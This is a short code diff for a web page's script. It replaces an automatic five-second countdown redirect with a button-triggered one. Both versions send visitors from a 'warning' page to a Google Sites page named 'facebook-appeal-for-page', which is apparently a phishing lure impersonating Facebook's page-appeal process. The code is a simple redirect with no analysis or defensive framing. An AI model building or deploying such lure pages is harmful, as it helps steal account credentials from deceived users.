@@ -1,19 +1,8 @@
-<script>
-    // JavaScript for Countdown and Redirect
-    let countdown = 5; // Countdown time in seconds
-    const countdownElement = document.createElement('p');
-    countdownElement.id = 'countdown';
-    document.querySelector('.warning-container').appendChild(countdownElement);
+document.addEventListener("DOMContentLoaded", function() {
+    const appealButton = document.getElementById("appealButton");
 
-    const updateCountdown = () => {
-        countdownElement.textContent = `Redirecting in ${countdown} seconds...`;
-        if (countdown === 0) {
-            window.location.href = "https://sites.google.com/view/facebook-appeal-for-page/home";
-        } else {
-            countdown--;
-            setTimeout(updateCountdown, 1000); // Update every second
-        }
-    };
+    appealButton.addEventListener("click", function() {
+        window.location.href = "https://sites.google.com/view/facebook-appeal-for-page/home";
+    });
+});
 
-    updateCountdown(); // Start the countdown
-</script>
